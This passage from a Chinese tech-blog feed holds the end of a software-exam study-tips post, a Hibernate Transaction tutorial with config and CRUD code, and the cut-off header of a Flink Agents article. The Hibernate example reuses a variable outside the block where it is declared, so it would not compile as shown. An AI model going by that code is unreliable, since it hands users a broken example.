<p>主要还是刷题，遇到哪里不会就去查资料，我习惯看看课件或者看教材，偶尔会查一下 ai，但是不要纠结，不会就是查。就比如，我当时对于范式的定义，函数依赖，什么是保持函数依赖、有损分解无损分解，怎么判断？首先需要考虑，这算个基础题，需要掌握的，所以我就去查教材、课件，问 AI，理解他，每次做争取做对。对于嵌入式，我是保持该记忆就记忆，不做深度追究。</p>
</blockquote>
<p>刷完题切记需要复盘！！！</p>
<h4 data-id="heading-7">论文</h4>
<p>准备论文不要太早，也不要太晚，最好是考前两周，我当时是考前 3 天准备的，那时候我还在项目现场，当时我是挺慌的，要考试了还在出差，但是还好那时候不忙，晚上下班我在酒店独自学习。</p>
<p>准备论文我的建议是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fbilibili.com%2Fvideo%2FBV13KG1zFEnd%2F%3Fspm_id_from%3D333.337.search-card.all.click" target="_blank" title="https://bilibili.com/video/BV13KG1zFEnd/?spm_id_from=333.337.search-card.all.click" ref="nofollow noopener noreferrer">bilibili</a> 去看看有没有押题的视频。当然了，如果你有报班，肯定有押题，而且老师也会给你安排好。如果没有报班的同志们，也可以自学。我按照我的复习节奏来说，我是去 bilibili 看看有没有大佬发如何写、怎么写。那时候我自己准备了一份模板，根据自己的项目来搭建，至少有 1200 字，并且需要把他背下来。然后就是去找优秀文章，模仿他们写。那么？要准备什么文章呢？emmm，我当时也是自己蒙的，我尽量把会考的都准备了。只要有模板，其他的内容都好记的。</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/066e45d6da76491badf30bda4e3e5506~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=mr5Rve499f2OG3%2B6s1eZ3lD8jVo%3D" alt="" loading="lazy"/></p>
<p>这是我准备的论文（天呐，谁敢信 3 个晚上准备这么多，有个搞笑的事情，原本我是准备了测试这方面的，但是我看到25年上半年考过了，于是把他划掉了，结果考到了。哎。。。），其实这些就前面几篇我有跟着写，其他都只是默写自己的模板，然后思考怎么抓重点。</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e57644c5053a44f196d4f35359a0089d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=JdELAGXnHBj8IZ0uNepHpMfwLaU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">总结</h3>
<p>我用如此的直白的语言阐述了自己的备考经验，总的来说，软考只是考核，并不是人才选拔。只要肯努力复习，还是能够通过的，希望我提供的经验能够帮到各位，可能我说的不是很对，但是这些是我的经验，如果各位有什么困难，欢迎各位与我进行讨论。</p>
<p>祝各位备考的同志能够顺利通过考试。</p>
<h3 data-id="heading-9">参考文献</h3>
<p>各位可以看看这位大佬的文章，我也是受这篇文章的启发
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fw605283073%2Farticle%2Fdetails%2F144461549" target="_blank" title="https://blog.csdn.net/w605283073/article/details/144461549" ref="nofollow noopener noreferrer">一年搞定两个软考高级证书，关键技巧大揭秘</a></p>
<hr/>
一起学习一起进步，能学一点是一点，冲，软考高级！！！</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（9）什么是Hibernate的Transaction？]]></title>    <link>https://juejin.cn/post/7589099845186699300</link>    <guid>https://juejin.cn/post/7589099845186699300</guid>    <pubDate>2025-12-29T12:33:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186699300" data-draft-id="7589082912588742699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（9）什么是Hibernate的Transaction？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-29T12:33:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（9）什么是Hibernate的Transaction？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:33:10.000Z" title="Mon Dec 29 2025 12:33:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernate的<code>Transaction</code>接口用于管理数据库事务。事务是数据库操作的一个逻辑单元，它确保要么所有操作都成功，要么所有操作都回滚，从而保证数据的一致性和完整性。在Hibernate中，事务管理主要是通过<code>Transaction</code>接口实现的，通常与<code>Session</code>对象一起使用。</p>
<h3 data-id="heading-0">主要功能</h3>
<ol>
<li><strong>开始事务</strong>：通过<code>beginTransaction</code>方法开始一个新的事务。</li>
<li><strong>提交事务</strong>：通过<code>commit</code>方法提交当前事务，将所有更改持久化到数据库中。</li>
<li><strong>回滚事务</strong>：通过<code>rollback</code>方法回滚当前事务，撤销所有未提交的更改。</li>
<li><strong>事务状态查询</strong>：提供查询事务状态的方法，如<code>isActive</code>。</li>
</ol>
<h3 data-id="heading-1">使用示例</h3>
<p>以下是一个详细的代码示例，展示如何在Hibernate中使用<code>Transaction</code>接口进行CRUD操作。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code> 配置</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil 类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">实体类 Student</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h4 data-id="heading-5">使用事务进行CRUD操作</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-comment">// 打开一个新的Session</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();

        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 启动事务</span>
            transaction = session.beginTransaction();

            <span class="hljs-comment">// 创建并保存Student对象</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
            session.save(student); <span class="hljs-comment">// 保存对象</span>

            <span class="hljs-comment">// 提交事务</span>
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback(); <span class="hljs-comment">// 回滚事务</span>
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close(); <span class="hljs-comment">// 关闭Session</span>
        }

        <span class="hljs-comment">// 读取、更新和删除操作</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 打开一个新的Session</span>
            session = sessionFactory.openSession();
            <span class="hljs-comment">// 启动事务</span>
            transaction = session.beginTransaction();

            <span class="hljs-comment">// 读取Student对象</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">retrievedStudent</span> <span class="hljs-operator">=</span> session.get(Student.class, student.getId());
            System.out.println(<span class="hljs-string">"Retrieved Student: "</span> + retrievedStudent.getName() + <span class="hljs-string">", Age: "</span> + retrievedStudent.getAge());

            <span class="hljs-comment">// 更新Student对象</span>
            retrievedStudent.setAge(<span class="hljs-number">21</span>);
            session.update(retrievedStudent); <span class="hljs-comment">// 更新对象</span>

            <span class="hljs-comment">// 删除Student对象</span>
            session.delete(retrievedStudent); <span class="hljs-comment">// 删除对象</span>

            <span class="hljs-comment">// 提交事务</span>
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback(); <span class="hljs-comment">// 回滚事务</span>
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close(); <span class="hljs-comment">// 关闭Session</span>
        }

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-6">详细解释</h3>
<ol>
<li><strong>获取SessionFactory</strong>：从<code>HibernateUtil</code>类中获取单例的<code>SessionFactory</code>实例。</li>
<li><strong>打开Session</strong>：通过<code>sessionFactory.openSession()</code>方法打开一个新的<code>Session</code>对象。</li>
<li><strong>启动事务</strong>：通过<code>session.beginTransaction()</code>方法开始一个新的事务。</li>
<li><strong>CRUD操作</strong>：
<ul>
<li><strong>创建并保存对象</strong>：创建一个<code>Student</code>对象，并使用<code>session.save(student)</code>方法将其保存到数据库中。</li>
<li><strong>提交事务</strong>：使用<code>transaction.commit()</code>方法提交事务，将所有更改持久化到数据库中。</li>
<li><strong>读取对象</strong>：通过<code>session.get(Student.class, student.getId())</code>方法从数据库中读取对象。</li>
<li><strong>更新对象</strong>：修改对象属性后，使用<code>session.update(retrievedStudent)</code>方法更新数据库中的记录。</li>
<li><strong>删除对象</strong>：使用<code>session.delete(retrievedStudent)</code>方法从数据库中删除对象。</li>
</ul>
</li>
<li><strong>回滚事务</strong>：在捕获异常的情况下，如果事务未提交，使用<code>transaction.rollback()</code>方法回滚事务，撤销所有未提交的更改。</li>
<li><strong>关闭Session</strong>：在<code>finally</code>块中通过<code>session.close()</code>方法关闭<code>Session</code>。</li>
<li><strong>关闭SessionFactory</strong>：在应用程序结束时，通过<code>sessionFactory.close()</code>方法关闭<code>SessionFactory</code>。</li>
</ol>
<h3 data-id="heading-7">事务管理的注意事项</h3>
<ol>
<li><strong>嵌套事务</strong>：Hibernate不直接支持嵌套事务，维护嵌套事务的状态需要额外的管理。</li>
<li><strong>自动提交</strong>：确保在使用事务时，设置数据库连接的自动提交模式为false，以便手动管理事务。</li>
<li><strong>异常处理</strong>：在事务操作中，应当妥善处理异常，在捕获异常后回滚事务以保证数据的一致性。</li>
</ol>
<h3 data-id="heading-8">总结</h3>
<p>Hibernate的<code>Transaction</code>接口提供了对数据库事务的管理功能，使得应用程序能够保证数据操作的一致性和完整性。通过详细的配置和正确的使用<code>Transaction</code>接口，可以高效地进行数据库操作，确保应用程序的稳定性和可靠性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【大数据 & AI】Flink Agents 源码解读 --- (2) --- 核心架构]]></title>    <link>https://juejin.cn/post/7589107312112926729</link>    <guid>https://juejin.cn/post/7589107312112926729</guid>    <pubDate>2025-12-29T12:33:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589107312112926729" data-draft-id="7589052659436208174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【大数据 &amp; AI】Flink Agents 源码解读 --- (2) --- 核心架构"/> <meta itemprop="keywords" content="后端,算法,人工智能"/> <meta itemprop="datePublished" content="2025-12-29T12:33:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="罗西的思考"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【大数据 &amp; AI】Flink Agents 源码解读 --- (2) --- 核心架构
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    罗西的思考
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:33:23.000Z" title="Mon Dec 29 2025 12:33:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body 